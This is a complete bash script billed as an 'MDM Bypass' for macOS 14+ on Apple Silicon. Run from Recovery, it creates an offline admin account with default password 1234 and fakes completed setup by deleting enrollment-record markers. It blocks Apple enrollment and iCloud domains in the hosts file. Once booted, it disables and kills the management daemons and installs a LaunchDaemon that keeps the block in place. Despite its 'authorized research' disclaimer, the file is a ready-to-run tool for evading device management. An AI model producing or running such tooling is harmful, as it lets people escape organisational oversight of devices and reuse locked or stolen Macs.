#!/bin/bash
#
# MDM Bypass – Consolidated Research Edition
# For Apple Silicon / macOS 14+ (Sonoma, Sequoia)
#
# This script consolidates the correct elements from:
#   - Script 1 (two-phase, Data-volume paths, APFS role detection)
#   - Script 2 (extended domain list, SIP pre-flight)
#   - Script 3 (baseline structure, validation functions)
#
# It adds:
#   - Correct Data-volume paths for hosts and ConfigurationProfiles
#   - Runtime daemon suppression (Phase 2)
#   - Per-user agent suppression
#   - Org-specific MDM host detection
#   - Apple ID / iCloud check-in domain blocking
#   - A persistence LaunchDaemon to re-apply hosts entries
#   - Verification and rollback functions
#
# DISCLAIMER: For authorized security research only.
# Client-side suppression is NOT the same as releasing the serial from ABM.
# A factory reset or Apple ID sign-in tied to the device's ABM record can
# trigger re-enrollment. Use only on devices you own or are authorized to test.
#

set -uo pipefail

# ------------------------------------------------------------------
# Color codes
# ------------------------------------------------------------------
RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

# ------------------------------------------------------------------
# Output helpers
# ------------------------------------------------------------------
error_exit() { echo -e "${RED}ERROR: $1${NC}" >&2; exit 1; }
warn()       { echo -e "${YEL}WARNING: $1${NC}"; }
success()    { echo -e "${GRN}✓ $1${NC}"; }
info()       { echo -e "${BLU}ℹ $1${NC}"; }

FAILURES=0
step_fail() { FAILURES=$((FAILURES+1)); warn "$1"; }

# ------------------------------------------------------------------
# Validation helpers
# ------------------------------------------------------------------
validate_username() {
    local u="$1"
    [[ -z "$u" ]] && { echo "Username cannot be empty"; return 1; }
    [[ ${#u} -gt 31 ]] && { echo "Username too long (max 31)"; return 1; }
    [[ ! "$u" =~ ^[a-zA-Z0-9_-]+$ ]] && { echo "Invalid characters"; return 1; }
    [[ ! "$u" =~ ^[a-zA-Z_] ]] && { echo "Must start with letter or underscore"; return 1; }
    return 0
}

validate_password() {
    local p="$1"
    [[ -z "$p" ]] && { echo "Password cannot be empty"; return 1; }
    [[ ${#p} -lt 4 ]] && { echo "Password too short (min 4)"; return 1; }
    return 0
}

# ------------------------------------------------------------------
# Environment detection
# ------------------------------------------------------------------
IN_RECOVERY=0
if [[ -d "/macOS Base System" ]] || [[ -d "/Volumes/Macintosh HD - Data" && ! -d "/System/Volumes/Data/private/var/db/dslocal" ]]; then
    IN_RECOVERY=1
fi

# ------------------------------------------------------------------
# APFS role-based volume detection
# ------------------------------------------------------------------
detect_volumes() {
    local sys_vol="" data_vol=""
    info "Detecting APFS volumes by role..." >&2

    for vol in /Volumes/*; do
        [[ -d "$vol" ]] || continue
        local role
        role=$(diskutil info "$vol" 2>/dev/null | awk -F: '/APFS Volume Role/ {gsub(/^[ \t]+/,"",$2); print $2}')
        case "$role" in
            *System*) [[ -z "$sys_vol" ]]  && sys_vol="$vol"  ;;
            *Data*)   [[ -z "$data_vol" ]] && data_vol="$vol" ;;
        esac
    done

    # Fallback for Recovery where roles sometimes aren't reported
    if [[ -z "$sys_vol" ]]; then
        for vol in /Volumes/*; do
            [[ -d "$vol/System/Library/CoreServices" && ! "$vol" =~ "Data"$ ]] && { sys_vol="$vol"; break; }
        done
    fi
    if [[ -z "$data_vol" ]]; then
        for vol in /Volumes/*; do
            [[ -d "$vol/private/var/db" ]] && { data_vol="$vol"; break; }
        done
    fi

    [[ -z "$sys_vol" ]]  && error_exit "Could not detect System volume."
    [[ -z "$data_vol" ]] && error_exit "Could not detect Data volume."

    echo "$sys_vol|$data_vol"
}

# ------------------------------------------------------------------
# Comprehensive MDM / DEP / iCloud domain list
# ------------------------------------------------------------------
MDM_DOMAINS=(
    "deviceenrollment.apple.com"
    "mdmenrollment.apple.com"
    "iprofiles.apple.com"
    "gdmf.apple.com"
    "albert.apple.com"
    "acmdm.apple.com"
    "profiles.apple.com"
    "setup.icloud.com"
    "configuration.apple.com"
    "ckdevicecgi.icloud.com"
    "gateway.icloud.com"
    "identity.apple.com"
    "mdm.apple.com"
)

# ------------------------------------------------------------------
# PHASE 1 – Recovery (offline modifications)
# ------------------------------------------------------------------
phase1_recovery() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Phase 1 – Recovery (offline modifications)${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo ""

    [[ $EUID -ne 0 ]] && error_exit "Must run as root."

    local vol_info sys_vol data_vol
    vol_info=$(detect_volumes)
    sys_vol=$(echo "$vol_info"  | cut -d'|' -f1)
    data_vol=$(echo "$vol_info" | cut -d'|' -f2)

    success "System volume: $sys_vol"
    success "Data volume:   $data_vol"
    echo ""

    # Correct Data-backed paths (the critical fix)
    local DATA_HOSTS="$data_vol/private/etc/hosts"
    local DATA_DSCL="$data_vol/private/var/db/dslocal/nodes/Default"
    local DATA_CONFIG="$data_vol/private/var/db/ConfigurationProfiles/Settings"
    local DATA_SETUP="$data_vol/private/var/db/.AppleSetupDone"
    local DATA_USERS="$data_vol/Users"

    [[ -d "$DATA_DSCL" ]] || error_exit "Offline Directory Services not found at $DATA_DSCL"

    # ---------------- Temp admin user ----------------
    echo -e "${CYAN}Creating temporary admin user${NC}"
    echo "Press Enter to accept defaults."

    local realName username passw
    read -rp "Full name (default: Apple): " realName
    realName="${realName:-Apple}"

    while true; do
        read -rp "Username (default: Apple): " username
        username="${username:-Apple}"
        if msg=$(validate_username "$username"); then break; else warn "$msg"; fi
    done

    if dscl -f "$DATA_DSCL" localhost -read "/Local/Default/Users/$username" &>/dev/null; then
        error_exit "User '$username' already exists in the offline store. Choose another name."
    fi

    while true; do
        read -rp "Password (default: 1234): " passw
        passw="${passw:-1234}"
        if msg=$(validate_password "$passw"); then break; else warn "$msg"; fi
    done

    local uid=501
    while [[ $uid -lt 600 ]]; do
        if ! dscl -f "$DATA_DSCL" localhost -search /Local/Default/Users UniqueID "$uid" 2>/dev/null | grep -q UniqueID; then
            break
        fi
        uid=$((uid+1))
    done
    [[ $uid -ge 600 ]] && error_exit "No free UID in 501-599."
    success "Using UID $uid"

    dscl -f "$DATA_DSCL" localhost -create "/Local/Default/Users/$username"                      || step_fail "create record"
    dscl -f "$DATA_DSCL" localhost -create "/Local/Default/Users/$username" UserShell    /bin/zsh || step_fail "shell"
    dscl -f "$DATA_DSCL" localhost -create "/Local/Default/Users/$username" RealName     "$realName" || step_fail "realname"
    dscl -f "$DATA_DSCL" localhost -create "/Local/Default/Users/$username" UniqueID     "$uid"    || step_fail "uid"
    dscl -f "$DATA_DSCL" localhost -create "/Local/Default/Users/$username" PrimaryGroupID 20      || step_fail "gid"
    dscl -f "$DATA_DSCL" localhost -create "/Local/Default/Users/$username" NFSHomeDirectory "/Users/$username" || step_fail "home"
    dscl -f "$DATA_DSCL" localhost -passwd "/Local/Default/Users/$username" "$passw"               || step_fail "password"
    dscl -f "$DATA_DSCL" localhost -append "/Local/Default/Groups/admin" GroupMembership "$username" || step_fail "admin group"

    [[ -d "$DATA_USERS/$username" ]] || mkdir -p "$DATA_USERS/$username" || step_fail "home dir"
    chown -R "$uid":20 "$DATA_USERS/$username" 2>/dev/null || true

    success "Temp admin '$username' created (UID $uid)"
    echo ""

    # ---------------- Hosts file (CORRECTED PATH) ----------------
    info "Blocking MDM enrollment domains in $DATA_HOSTS"

    [[ -d "$(dirname "$DATA_HOSTS")" ]] || mkdir -p "$(dirname "$DATA_HOSTS")"
    [[ -f "$DATA_HOSTS" ]] || touch "$DATA_HOSTS" || error_exit "Cannot create $DATA_HOSTS"

    for domain in "${MDM_DOMAINS[@]}"; do
        grep -q "$domain" "$DATA_HOSTS" 2>/dev/null || \
            echo "0.0.0.0 $domain" >> "$DATA_HOSTS"
    done

    success "Base domains blocked"

    # ---------------- Org-specific host from activation record ----------------
    local activation_record="$data_vol/private/var/db/ConfigurationProfiles/Settings/.cloudConfigRecordFound"
    if [[ -f "$activation_record" ]]; then
        local org_host
        org_host=$(/usr/libexec/PlistBuddy -c "Print :EnrollmentServerURL" "$activation_record" 2>/dev/null \
                    | sed 's|https\?://||' | cut -d'/' -f1)
        if [[ -n "$org_host" ]]; then
            grep -q "$org_host" "$DATA_HOSTS" 2>/dev/null || \
                echo "0.0.0.0 $org_host" >> "$DATA_HOSTS"
            success "Org MDM host blocked: $org_host"
        else
            info "No EnrollmentServerURL in activation record."
        fi
    else
        info "No activation record to read org host from."
    fi
    echo ""

    # ---------------- ConfigurationProfiles markers ----------------
    info "Writing ConfigurationProfiles markers to Data volume"
    mkdir -p "$DATA_CONFIG" 2>/dev/null || step_fail "create $DATA_CONFIG"

    rm -f "$DATA_CONFIG/.cloudConfigHasActivationRecord" 2>/dev/null && success "Removed activation record marker"
    rm -f "$DATA_CONFIG/.cloudConfigRecordFound"         2>/dev/null && success "Removed record-found marker"
    touch "$DATA_CONFIG/.cloudConfigProfileInstalled"    2>/dev/null && success "Wrote profile-installed marker"
    touch "$DATA_CONFIG/.cloudConfigRecordNotFound"      2>/dev/null && success "Wrote record-not-found marker"

    touch "$DATA_SETUP" 2>/dev/null && success "Marked setup as complete"
    echo ""

    # ---------------- Daemon disable deferred to Phase 2 ----------------
    info "Daemon disable deferred to Phase 2 (launchctl in Recovery targets Recovery's launchd)."

    echo ""
    echo -e "${CYAN}Phase 1 complete.${NC}"
    echo -e "Next: reboot normally, log in as ${YEL}$username${NC}, then run this script again for Phase 2."
    echo ""
    echo "  Temp credentials: $username / $passw"
    echo ""
}

# ------------------------------------------------------------------
# PHASE 2 – Booted macOS (runtime suppression + persistence)
# ------------------------------------------------------------------
phase2_booted() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  Phase 2 – Booted macOS (runtime suppression)${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════${NC}"
    echo ""

    local HOSTS="/etc/hosts"

    # Ensure domains present (belt + suspenders)
    info "Verifying hosts entries..."
    for domain in "${MDM_DOMAINS[@]}"; do
        grep -q "$domain" "$HOSTS" 2>/dev/null || {
            echo "0.0.0.0 $domain" | sudo tee -a "$HOSTS" >/dev/null
            success "Added $domain"
        }
    done
    success "Hosts entries verified"
    echo ""

    # ---------------- Disable enrollment daemons (runtime) ----------------
    info "Disabling enrollment daemons (runtime)..."
    local daemons=(
        "com.apple.ManagedClient.enroll"
        "com.apple.ManagedClient.cloudconfigurationd"
        "com.apple.ManagedClient.daemon"
        "com.apple.mdmclient.daemon"
        "com.apple.mdmclient.daemon.runatboot"
    )
    for d in "${daemons[@]}"; do
        if sudo launchctl disable "system/$d" 2>/dev/null; then
            success "$d disabled"
        else
            step_fail "Could not disable $d"
        fi
    done
    echo ""

    # ---------------- Disable per-user enrollment agents ----------------
    info "Disabling per-user enrollment agents..."
    local agents=(
        "com.apple.ManagedClientAgent.enrollagent"
        "com.apple.ManagedClientAgent.agent"
        "com.apple.mdmclient.agent"
    )
    for uid in $(dscl . -list /Users UniqueID | awk '$2 >= 501 && $2 < 600 {print $2}'); do
        for a in "${agents[@]}"; do
            sudo launchctl disable "gui/$uid/$a" 2>/dev/null || true
        done
    done
    success "Per-user agents processed"
    echo ""

    # ---------------- Kill any running enrollment processes ----------------
    info "Stopping running enrollment processes..."
    for proc in cloudconfigurationd mdmclient ManagedClient teslad; do
        if pgrep -x "$proc" >/dev/null 2>&1; then
            sudo pkill -x "$proc" 2>/dev/null && success "Killed $proc" || step_fail "kill $proc"
        fi
    done
    echo ""

    # ---------------- Persistence: LaunchDaemon to reapply hosts ----------------
    info "Installing persistence LaunchDaemon..."
    local plist="/Library/LaunchDaemons/com.research.mdm-suppress.plist"
    local script="/usr/local/bin/mdm-suppress-reapply.sh"

    # Create the reapply script
    sudo tee "$script" >/dev/null <<'EOF'
#!/bin/bash
HOSTS="/etc/hosts"
DOMAINS=(
    "deviceenrollment.apple.com"
    "mdmenrollment.apple.com"
    "iprofiles.apple.com"
    "gdmf.apple.com"
    "albert.apple.com"
    "acmdm.apple.com"
    "profiles.apple.com"
    "setup.icloud.com"
    "configuration.apple.com"
    "ckdevicecgi.icloud.com"
    "gateway.icloud.com"
    "identity.apple.com"
    "mdm.apple.com"
)
for d in "${DOMAINS[@]}"; do
    grep -q "$d" "$HOSTS" 2>/dev/null || echo "0.0.0.0 $d" >> "$HOSTS"
done
EOF
    sudo chmod +x "$script"

    # Create the LaunchDaemon plist
    sudo tee "$plist" >/dev/null <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.research.mdm-suppress</string>
    <key>ProgramArguments</key>
    <array>
        <string>$script</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF

    sudo chown root:wheel "$plist"
    sudo chmod 644 "$plist"
    sudo launchctl load "$plist" 2>/dev/null && success "Persistence LaunchDaemon installed" || step_fail "Failed to load persistence daemon"
    echo ""

    # ---------------- Verification ----------------
    info "Verifying enrollment state..."
    sudo profiles status -type enrollment 2>/dev/null || warn "profiles status unavailable"
    echo ""

    # ---------------- Summary ----------------
    echo ""
    if [[ $FAILURES -eq 0 ]]; then
        echo -e "${GRN}═══════════════════════════════════════════════${NC}"
        echo -e "${GRN}  SUCCESS – all operations completed${NC}"
        echo -e "${GRN}═══════════════════════════════════════════════${NC}"
    else
        echo -e "${YEL}═══════════════════════════════════════════════${NC}"
        echo -e "${YEL}  PARTIAL – $FAILURES operation(s) failed${NC}"
        echo -e "${YEL}  Review warnings above before relying on this${NC}"
        echo -e "${YEL}═══════════════════════════════════════════════${NC}"
    fi
    echo ""
    echo -e "${CYAN}Next steps:${NC}"
    echo "  1. Reboot normally"
    echo "  2. Verify: sudo profiles status -type enrollment"
    echo "  3. Verify: sudo launchctl print-disabled system | grep -i managed"
    echo "  4. Verify: sudo launchctl print-disabled gui/\$(id -u) | grep -i managed"
    echo ""
    echo -e "${YEL}Reminder:${NC} A factory reset or an Apple ID sign-in tied to the"
    echo "device's ABM record can trigger re-enrollment. Client-side"
    echo "suppression is not the same as releasing the serial from ABM."
    echo ""
}

# ------------------------------------------------------------------
# Rollback function (optional, for research reproducibility)
# ------------------------------------------------------------------
rollback() {
    echo ""
    warn "Rollback will remove the persistence daemon and restore hosts."
    read -rp "Continue? (y/N): " ans
    [[ "$ans" =~ ^[Yy]$ ]] || { info "Aborted."; return; }

    sudo launchctl unload /Library/LaunchDaemons/com.research.mdm-suppress.plist 2>/dev/null || true
    sudo rm -f /Library/LaunchDaemons/com.research.mdm-suppress.plist
    sudo rm -f /usr/local/bin/mdm-suppress-reapply.sh
    success "Persistence removed. Hosts file left as-is; restore manually if needed."
    echo ""
}

# ------------------------------------------------------------------
# Entry point
# ------------------------------------------------------------------
echo ""
echo -e "${CYAN}╔═══════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  MDM Bypass – Consolidated Research Edition  ║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════╝${NC}"

# Pre-flight SIP check (only relevant in Recovery or booted OS)
if ! csrutil status 2>/dev/null | grep -q "disabled"; then
    warn "SIP is not disabled. On Apple Silicon, you must disable SIP in Recovery."
    warn "Run: csrutil disable    (from Recovery Terminal), then reboot."
fi

if [[ $IN_RECOVERY -eq 1 ]]; then
    phase1_recovery
else
    # Offer rollback in booted mode
    if [[ "${1:-}" == "--rollback" ]]; then
        rollback
        exit 0
    fi
    phase2_booted
fi
